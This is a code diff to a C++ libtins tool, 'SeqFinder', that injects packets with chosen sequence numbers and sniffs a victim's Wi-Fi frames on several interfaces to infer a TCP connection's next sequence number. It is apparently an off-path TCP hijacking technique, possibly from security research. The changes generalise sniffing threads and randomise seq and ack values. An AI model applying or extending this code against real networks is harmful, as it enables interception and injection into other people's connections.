@@ -11,32 +11,17 @@
 
 using namespace Tins;
 
-void SeqFinder::capturePackets_1(std::vector<Packet>& pkts_1) {
+void SeqFinder::capturePackets(std::vector<Packet>& pkts, int sniff_if_index) {
     SnifferConfiguration config;
     config.set_filter("wlan addr1 " + client_mac);
     config.set_immediate_mode(true);
-    Sniffer sniffer(sniff_if_name[0], config);
+    Sniffer sniffer(sniff_if_name[sniff_if_index], config);
 
     auto s_time = std::chrono::high_resolution_clock::now();
     auto duration = std::chrono::milliseconds(50);
     while (std::chrono::high_resolution_clock::now()-s_time < duration) {
         Packet packet=sniffer.next_packet();
-        pkts_1.push_back(packet);
-    }
-
-}
-
-void SeqFinder::capturePackets_2(std::vector<Packet>& pkts_2) {
-    SnifferConfiguration config;
-    config.set_filter("wlan addr1 " + client_mac);
-    config.set_immediate_mode(true);
-    Sniffer sniffer(sniff_if_name[1], config);
-
-    auto s_time = std::chrono::high_resolution_clock::now();
-    auto duration = std::chrono::milliseconds(50);
-    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
-        Packet packet=sniffer.next_packet();
-        pkts_2.push_back(packet);
+        pkts.push_back(packet);
     }
 
 }
@@ -72,6 +57,8 @@ void SeqFinder::checkSeqList(const std::vector<uint32_t>& seq_list) {
         TCP &tcp = packet.rfind_pdu<TCP>();
         tcp.set_flag(TCP::ACK, true);
         tcp.seq(sq);
+        tcp.ack_seq(random_ack);
+
         for (int i = 0; i < repeat_num; i++) {
             send_list.emplace_back(packet);
         }
@@ -82,17 +69,20 @@ void SeqFinder::checkSeqList(const std::vector<uint32_t>& seq_list) {
         send_byte += pkt.size();
     }
 
-    //First sniff Wi-Fi card
-    std::vector<Packet> pkts_1;
-    SeqFinder sniff_object;
-    std::thread sniffer_thread(&SeqFinder::capturePackets_1, &sniff_object, std::ref(pkts_1));
+    std::vector<std::vector<Packet>> sniff_pkts_vec;
+    int sniff_pkts_vec_num = sniff_if_name.size();
+    
+    for(int i=0; i<sniff_pkts_vec_num; i++){
+        std::vector<Packet> sniff_pkts;
+        sniff_pkts_vec.push_back(sniff_pkts);
+    }
 
-    //Second sniff Wi-Fi card
-    std::vector<Packet> pkts_2;
-    SeqFinder sniff_object_2;
-    std::thread sniffer_thread_2(&SeqFinder::capturePackets_1, &sniff_object_2, std::ref(pkts_2));
+    std::vector<std::thread> sniff_thread_vec;
+    for(int i=0; i<sniff_pkts_vec.size(); i++){
+        sniff_thread_vec.emplace_back(&SeqFinder::capturePackets, this, std::ref(sniff_pkts_vec[i]), i);
+    }
 
-
+    std::this_thread::sleep_for(std::chrono::milliseconds(5));
 
     PacketSender sender;
     for(auto pkt : send_list){
@@ -106,24 +96,30 @@ void SeqFinder::checkSeqList(const std::vector<uint32_t>& seq_list) {
     IP add_packet = IP(client_ip, add_ip) / TCP(1234, 4321) / RawPDU("AAAAA");
     TCP &tcp = add_packet.rfind_pdu<TCP>();
     tcp.set_flag(TCP::ACK, true);
-
+    
     for (int i =0; i<4; i++) {
         sender.send(add_packet, send_if_name);
     }
 
-    sniffer_thread.join();
-    sniffer_thread_2.join();
+    for(auto& t: sniff_thread_vec){
+        if(t.joinable()){
+            t.join();
+        }
+    }
 
     /* Merge sniffed Wi-Fi frames */
-    pkts_1.insert(pkts_1.end(), pkts_2.begin(), pkts_2.end());
+    std::vector<Packet> sniff_pkts_merge;
+    for(int i=0; i<sniff_pkts_vec.size(); i++){
+        sniff_pkts_merge.insert(sniff_pkts_merge.end(), sniff_pkts_vec[i].begin(), sniff_pkts_vec[i].end());
+    }
 
-    handle_packets(pkts_1);
+    handle_packets(sniff_pkts_merge);
 }
 
 void SeqFinder::seqCheck(uint32_t sq, SeqNextLocation& location) {
     uint32_t seq_next_left = 0;
     int check_line = 1;
-    int check_sum = 2;
+    int check_sum = 3;
 
     for (int i = 0; i < check_sum; i++) {
         checkSeqList({sq});
@@ -134,16 +130,12 @@ void SeqFinder::seqCheck(uint32_t sq, SeqNextLocation& location) {
                 return;
             }      
         }
-        else if ((seq_next_left+check_sum-i) < check_line) {
-            location = SEQ_NEXT_R;
-            return;
-        }
-}
+    }
     location = SEQ_NEXT_R;
 }
 
 void SeqFinder::findSentSeq() {
-    sent_seq = 0;
+    sent_seq = random_seq;
     SeqNextLocation location;
     seqCheck(static_cast<uint32_t>(sent_seq), location);
 
@@ -186,7 +178,7 @@ void SeqFinder::findSeqExact() {
     }
 
     sent_seq_left_bound = ans >= 0 ? ans : ans + maxUint32Value;
-    result = static_cast<uint32_t>(sent_seq_left_bound + maxUint32Value_half);
+    result = static_cast<uint32_t>(sent_seq_left_bound + maxUint32Value_half + 1);
 
     std::cout << "[+] Find the sent seq left bound: " << sent_seq_left_bound << ", the seq next: " << result << std::endl;
 }
@@ -211,6 +203,13 @@ void SeqFinder::run() {
     send_byte = 0;
     sent_seq_left_bound = -1;
     result = 0;
+
+    std::random_device rd;
+    std::mt19937_64 eng(rd());
+    std::uniform_int_distribution<uint32_t> distr(0, maxUint32Value);
+    random_seq = distr(eng);
+    random_ack = distr(eng);
+
     findSeqExact();
 
     auto time_end = std::chrono::system_clock::now();
